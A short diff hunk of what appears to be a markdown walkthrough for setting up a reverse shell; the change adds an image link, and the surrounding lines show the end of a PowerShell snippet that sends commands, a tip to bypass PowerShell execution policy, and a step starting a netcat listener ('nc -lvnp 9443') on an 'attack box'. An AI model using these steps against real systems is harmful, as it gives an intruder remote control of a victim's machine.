@@ -61,6 +61,9 @@ $s.Send($command)
 ```
 ⚠️ You may need to run Set-ExecutionPolicy Bypass -Scope Process before running this.
 
+![image](https://github.com/user-attachments/assets/31b57bc8-688e-4131-9f7d-1464079bcf60)
+
+
 ### 📍 5. Start Netcat Listener on Your Attack Box
 ```bash
 nc -lvnp 9443
